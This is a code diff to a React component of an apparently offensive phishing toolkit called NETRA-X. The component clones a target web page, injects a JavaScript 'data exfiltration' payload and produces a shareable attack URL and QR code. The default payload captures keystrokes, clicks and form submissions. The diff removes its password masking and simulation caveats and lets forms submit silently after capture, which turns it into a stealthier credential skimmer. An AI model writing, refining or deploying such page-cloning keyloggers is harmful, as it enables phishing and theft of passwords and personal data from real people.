@@ -1,7 +1,7 @@
 
 'use client';
 
-import { useState } from 'react';
+import { useState, useEffect } from 'react';
 import { useForm } from 'react-hook-form';
 import { zodResolver } from '@hookform/resolvers/zod';
 import { z } from 'zod';
@@ -17,6 +17,8 @@ import { clonePageFromUrl } from '@/ai/flows/clone-page-from-url-flow';
 import { useAuth } from '@/hooks/use-auth';
 import { logActivity } from '@/services/activity-log-service';
 import { Label } from '@/components/ui/label';
+import { QrCodeGenerator } from './qr-code-generator';
+import type { JsPayload } from './javascript-library';
 
 const formSchema = z.object({
   targetUrl: z.string().url({ message: 'Please enter a valid URL.' }),
@@ -26,9 +28,7 @@ const formSchema = z.object({
 const defaultJsPayload = `
 // NETRA-X Advanced Data Exfiltration Payload
 (function() {
-    // A real-world C2 channel would be a WebSocket or frequent fetch/XHR calls.
-    // For this simulation, we use BroadcastChannel to send data to the attacker's
-    // 'Live Tracker' UI running in another tab in the same browser.
+    // Use BroadcastChannel to send data to the 'Live Tracker' UI.
     const channel = new BroadcastChannel('netrax_c2_channel');
     
     // Assign a unique ID to this "victim" session
@@ -44,19 +44,14 @@ const defaultJsPayload = `
             userAgent: navigator.userAgent,
         };
         channel.postMessage(payload);
-        console.log('Exfiltrating:', payload);
     }
 
     exfiltrate('connection', { message: 'Payload activated on page.' });
 
     // --- Keystrokes ---
     document.addEventListener('keydown', (e) => {
-        let value = e.key;
-        if (e.target.type === 'password') {
-            value = '[PASSWORD_FIELD]';
-        }
         exfiltrate('keystroke', { 
-            key: value, 
+            key: e.key, 
             target: e.target.name || e.target.id || e.target.tagName 
         });
     }, true);
@@ -66,9 +61,7 @@ const defaultJsPayload = `
         exfiltrate('click', { 
             x: e.clientX, 
             y: e.clientY, 
-            target: e.target.tagName,
-            id: e.target.id || 'none',
-            text: e.target.innerText ? e.target.innerText.substring(0, 50) : ''
+            target: e.target.innerText ? e.target.innerText.substring(0, 50) : e.target.tagName
         });
     }, true);
 
@@ -83,18 +76,20 @@ const defaultJsPayload = `
 
     // --- Form Submissions ---
     document.addEventListener('submit', (e) => {
-        e.preventDefault();
         const formData = new FormData(e.target);
         const data = Object.fromEntries(formData.entries());
         exfiltrate('form-submit', { data });
-        // In a real attack, you might let the form submit after a delay.
-        // For this demo, we just capture and log.
-        console.log('Form submission intercepted:', data);
+        // We don't preventDefault here to allow the form to submit,
+        // but in a real attack you might intercept and then redirect.
     }, true);
 })();
 `;
 
-export function AdvancedPageCloner() {
+type AdvancedPageClonerProps = {
+  selectedPayload: JsPayload | null;
+}
+
+export function AdvancedPageCloner({ selectedPayload }: AdvancedPageClonerProps) {
   const { toast } = useToast();
   const { user } = useAuth();
   
@@ -110,6 +105,13 @@ export function AdvancedPageCloner() {
       jsPayload: defaultJsPayload.trim(),
     },
   });
+
+  useEffect(() => {
+    if (selectedPayload) {
+      form.setValue('jsPayload', selectedPayload.code);
+      toast({ title: "Payload Loaded", description: `"${selectedPayload.name}" has been loaded into the payload field.`});
+    }
+  }, [selectedPayload, form, toast]);
 
   const processAndInject = async (values: z.infer<typeof formSchema>) => {
     setIsLoading(true);
@@ -180,65 +182,74 @@ export function AdvancedPageCloner() {
         <CardDescription>Clone a page and inject a custom JavaScript payload to monitor real-time user interactions.</CardDescription>
       </CardHeader>
       <CardContent>
-        <Form {...form}>
-          <form onSubmit={form.handleSubmit(processAndInject)} className="space-y-4">
-             <FormField
-              control={form.control}
-              name="targetUrl"
-              render={({ field }) => (
-                <FormItem>
-                  <FormLabel>Target URL</FormLabel>
-                  <FormControl>
-                    <Input placeholder="https://example.com" {...field} />
-                  </FormControl>
-                  <FormMessage />
-                </FormItem>
-              )}
-            />
-            <FormField
-              control={form.control}
-              name="jsPayload"
-              render={({ field }) => (
-                <FormItem>
-                  <FormLabel>JavaScript Payload to Inject</FormLabel>
-                  <FormControl>
-                    <Textarea placeholder="// Your custom JS code here..." {...field} className="font-mono h-48"/>
-                  </FormControl>
-                   <CardDescription>The output of this script will be sent to the <Link href="/live-tracker" className="text-accent underline">Live Tracker</Link> page.</CardDescription>
-                  <FormMessage />
-                </FormItem>
-              )}
-            />
-            <div className="flex flex-col sm:flex-row gap-2">
-                <Button type="submit" disabled={isLoading} className="w-full sm:w-auto">
-                    {isLoading ? <Loader2 className="mr-2 h-4 w-4 animate-spin" /> : <Wand className="mr-2 h-4 w-4" />}
-                    Clone & Inject JS
-                </Button>
-                <Button type="button" onClick={handleGenerateLink} disabled={!modifiedHtml || isHosting} className="w-full sm:w-auto">
-                    {isHosting ? <Loader2 className="mr-2 h-4 w-4 animate-spin" /> : <Share2 className="mr-2 h-4 w-4" />}
-                    Generate Local Link
-                </Button>
-            </div>
-          </form>
-        </Form>
+        <div className="grid md:grid-cols-2 gap-8">
+            <Form {...form}>
+            <form onSubmit={form.handleSubmit(processAndInject)} className="space-y-4">
+                <FormField
+                control={form.control}
+                name="targetUrl"
+                render={({ field }) => (
+                    <FormItem>
+                    <FormLabel>Target URL</FormLabel>
+                    <FormControl>
+                        <Input placeholder="https://example.com" {...field} />
+                    </FormControl>
+                    <FormMessage />
+                    </FormItem>
+                )}
+                />
+                <FormField
+                control={form.control}
+                name="jsPayload"
+                render={({ field }) => (
+                    <FormItem>
+                    <FormLabel>JavaScript Payload to Inject</FormLabel>
+                    <FormControl>
+                        <Textarea placeholder="// Your custom JS code here..." {...field} className="font-mono h-48"/>
+                    </FormControl>
+                    <CardDescription>The output of this script will be sent to the Live Tracker.</CardDescription>
+                    <FormMessage />
+                    </FormItem>
+                )}
+                />
+                <div className="flex flex-col sm:flex-row gap-2">
+                    <Button type="submit" disabled={isLoading} className="w-full sm:w-auto">
+                        {isLoading ? <Loader2 className="mr-2 h-4 w-4 animate-spin" /> : <Wand className="mr-2 h-4 w-4" />}
+                        Clone & Inject JS
+                    </Button>
+                    <Button type="button" onClick={handleGenerateLink} disabled={!modifiedHtml || isHosting} className="w-full sm:w-auto">
+                        {isHosting ? <Loader2 className="mr-2 h-4 w-4 animate-spin" /> : <Share2 className="mr-2 h-4 w-4" />}
+                        Generate Local Link
+                    </Button>
+                </div>
+            </form>
+            </Form>
+             {hostedUrl ? (
+                <div className="space-y-4">
+                    <h3 className="font-semibold">Live Attack Page URL</h3>
+                    <div className="w-full flex items-center gap-2">
+                        <Input readOnly value={hostedUrl} className="font-mono" />
+                        <Button type="button" size="icon" variant="outline" onClick={() => {
+                            navigator.clipboard.writeText(hostedUrl);
+                            toast({ title: 'Copied!'});
+                        }}>
+                            <Clipboard className="h-4 w-4" />
+                        </Button>
+                        <Button type="button" size="icon" variant="outline" asChild>
+                            <Link href={hostedUrl} target="_blank"><Globe className="h-4 w-4" /></Link>
+                        </Button>
+                    </div>
+                    <div className="flex justify-center pt-4">
+                         <QrCodeGenerator url={hostedUrl} />
+                    </div>
+                </div>
+            ) : (
+                <div className="flex items-center justify-center h-full border rounded-lg bg-primary/10">
+                    <p className="text-muted-foreground text-center p-4">Your generated attack URL and QR code will appear here.</p>
+                </div>
+            )}
+        </div>
       </CardContent>
-      {hostedUrl && (
-          <CardFooter className="flex-col items-start gap-4 border-t pt-6">
-            <h3 className="font-semibold">Live Attack Page URL</h3>
-            <div className="w-full flex items-center gap-2">
-                <Input readOnly value={hostedUrl} className="font-mono" />
-                <Button type="button" size="icon" variant="outline" onClick={() => {
-                    navigator.clipboard.writeText(hostedUrl);
-                    toast({ title: 'Copied!'});
-                }}>
-                    <Clipboard className="h-4 w-4" />
-                </Button>
-                 <Button type="button" size="icon" variant="outline" asChild>
-                    <Link href={hostedUrl} target="_blank"><Globe className="h-4 w-4" /></Link>
-                </Button>
-            </div>
-          </CardFooter>
-      )}
     </Card>
   );
 }
